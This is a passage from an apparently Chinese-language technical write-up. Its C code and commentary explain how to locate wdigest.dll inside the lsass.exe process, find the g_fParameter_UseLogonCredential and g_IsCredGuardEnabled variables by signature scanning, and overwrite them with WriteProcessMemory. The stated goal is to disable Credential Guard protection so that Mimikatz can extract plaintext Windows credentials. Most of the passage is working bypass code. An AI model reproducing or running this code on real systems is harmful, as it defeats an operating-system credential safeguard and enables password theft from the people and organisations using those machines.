            wprintf(L"[*] Base address of wdigest.dll: 0x%016llx\n", LsassPackage.Module.Informations.DllBase.address);
            if (LsaSearchGeneric(&cLsass, &LsassPackage.Module, g_References, ARRAYSIZE(g_References), (PVOID*)&g_fParameter_UseLogonCredential, (PVOID*)&g_IsCredGuardEnabled)
                && LsassPackage.Module.isInit)
            {
                wprintf(L"[*] Address of g_fParameter_UseLogonCredential: 0x%016llx\n", g_fParameter_UseLogonCredential);
                wprintf(L"[*] Address of g_IsCredGuardEnabled: 0x%016llx\n", g_IsCredGuardEnabled);
                status = TRUE;
            }
        }
        return status;
    }
先我们首先要获取lsass.exe
这个进程的pid，然后才能从其中获取其加载的wdigest.dll模块信息。主要是通过GetVeryBasicModuleInformations
这个函数获取lsass.exe 进程的基本信息
    BOOL GetVeryBasicModuleInformations(HANDLE hProcess)
    {
        BOOL status = FALSE;
        PEB Peb;
        PEB_LDR_DATA LdrData;
        LDR_DATA_TABLE_ENTRY LdrEntry;
        PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
        UNICODE_STRING moduleName;
        PBYTE pListEntryStart, pListEntryEnd;
        moduleInformation.ModuleName = &moduleName;
        if (GetProcessPeb(hProcess, &Peb))
        {
            if (ReadProcessMemory(hProcess, Peb.Ldr, &LdrData, sizeof(PEB_LDR_DATA), NULL))
            {
                for (
                    pListEntryStart = (PBYTE)LdrData.InLoadOrderModuleList.Flink,
                    pListEntryEnd = (PBYTE)Peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModuleList);
                    pListEntryStart != pListEntryEnd;
                    pListEntryStart = (PBYTE)LdrEntry.InLoadOrderLinks.Flink
                    )
                {
                    if (ReadProcessMemory(hProcess, pListEntryStart, &LdrEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL))
                    {
                        moduleInformation.DllBase.address = LdrEntry.DllBase;
                        moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
                        moduleName = LdrEntry.BaseDllName;
                        if (GetUnicodeString(&moduleName, cLsass.hProcess))
                        {
                            status = FindModules(&moduleInformation);
                        }
                        LocalFree(moduleName.Buffer);
                    }
                }
            }
        }
        return status;
    }
而在GetVeryBasicModuleInformations 函数内又编写了一个函数GetProcessPeb
这个函数的功能很简单就是通过NtQueryInformationProcess 检索lsass进程的信息  
然后GetVeryBasicModuleInformations
函数内其他部分主要是遍历了PEB结构，通过获取lsass进程的PEB数据块，这样就能获取到lsass.exe 进程加载的 wdigest.dll
模块的地址等信息，获取到的信息通过定义的PROCESS_VERY_BASIC_MODULE_INFORMATION结构体，存放在其中。
这样获取wdigest.dll 信息后，就该进行获取两个变量g_fParameter_UserLogonCredential 和
g_IsCredGuardEnabled了  
而获取这两个变量的话，其实做法是跟Mimikatz差不多也是采用通过获取系统版本特征码，然后用特征码进行识别和扫描进行对比。
    BOOL LsaSearchGeneric(PLSA_CONTEXT cLsass, PLSA_LIB pLib, PPATCH_GENERIC genericReferences, SIZE_T cbReferences, PVOID* genericPtr, PVOID* genericPtr1)
    {
        BOOL status = FALSE;
        MEMORY_SEARCH sMemory = { {pLib->Informations.DllBase.address, pLib->Informations.SizeOfImage}, NULL };
        PPATCH_GENERIC currentReference;
        LONG offset;
        MEMORY_ADDRESS lsassMemory;
        if (currentReference = GetGenericFromBuild(genericReferences, cbReferences, cLsass->osContext.BuildNumber))
        {
            if (MemorySearch(cLsass->hProcess, currentReference->Search.Pattern, currentReference->Search.Length, &sMemory))
            {
                wprintf(L"[*] Matched signature at 0x%016llx: ", sMemory.result);
                PrintfHex(currentReference->Search.Pattern, currentReference->Search.Length);
                lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
                if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
                {
                    *genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
                }
                if (genericPtr1)
                {
                    lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
                    if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
                    {
                        *genericPtr1 = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
                    }
                }
            }
        }
        pLib->isInit = status;
        return status;
    }
LsaSearchGeneric 函数主要通过
GetGenericFromBuild函数（它会根据版本号的，选择合适的规则）获取特征码，然后再通过MemorySearch
函数在内存中匹配特别获取到的特征码，然后遍历范围内的内存。最后通过RtlEqualMemory 函数去获取和特征码一样的内存块。得到特征码的地址  
上述代码分析g_IsCredGuardEnabled判断的地方 查看汇编代码的话，可以得到cmp
cs:g_fParameter_UseLogonCredential 指令，这个指令就是保存了g_fParameter_UseLogonCredential
变量的地址，这样通过这个指令 我们就能获取到特征了就可以方便后续的匹配从而确定偏移地址继而算出变量地址。  
所以最后通过ReadProcessMemory函数读入该进程的内存空间获取这个变量的偏移量。再通过计算
    (PBYTE)sMemory.result + currentReference->Offsets.off0
最后这样就成功得到 g_fParameter_useLogonCredential 的地址 g_IsCredGuardEnabled
也是一样的方法获取到其变量的地址。  
最后通过PatchMemory 函数修改变量在内存的值（主要就是通过WriteProcessMemory 来进行内存地址的修改），然后达到绕过的效果。
    BOOL PatchMemory()
    {
        BOOL status = FALSE;
        DWORD dwCurrent;
        DWORD UseLogonCredential = 1;
        DWORD IsCredGuardEnabled = 0;
        status = AcquireLSA();
        if (status)
        {
            if (ReadProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, &dwCurrent, sizeof(DWORD), NULL))
            {
                wprintf(L"[*] The current value of g_fParameter_UseLogonCredential is %d\n", dwCurrent);
                if (WriteProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, (PVOID)&UseLogonCredential, sizeof(DWORD), NULL))
                {
                    wprintf(L"[*] Patched value of g_fParameter_UseLogonCredential to 1\n");
                    status = TRUE;
                }
                else
                    wprintf(L"[-] Failed to WriteProcessMemory for g_fParameter_UseLogonCredential.\n");
            }
            else
                wprintf(L"[-] Failed to ReadProcessMemory for g_fParameter_UseLogonCredential\n");
            if (ReadProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, &dwCurrent, sizeof(DWORD), NULL))
            {
                wprintf(L"[*] The current value of g_IsCredGuardEnabled is %d\n", dwCurrent);
                if (WriteProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, (PVOID)&IsCredGuardEnabled, sizeof(DWORD), NULL))
                {
                    wprintf(L"[*] Patched value of g_IsCredGuardEnabled to 0\n");
                    status = TRUE;
                }
                else
                    wprintf(L"[-] Failed to WriteProcessMemory for g_IsCredGuardEnabled.\n");
            }
            else
                wprintf(L"[-] Failed to ReadProcessMemory for g_IsCredGuardEnabled\n");
        }
        return status;
    }
最后成功实现 完成绕过
总结一下其就是找到了决定因素的两个变量，然后通过lsass进程来确定wdigest.dll地址，继而再去获取到g_fParameter_useLogonCredential
和 g_IsCredGuardEnabled 的地址，然后修改其内存中的值这样就使其防护失效了。最后就可以通过Mimikatz完成获取明文凭证的效果。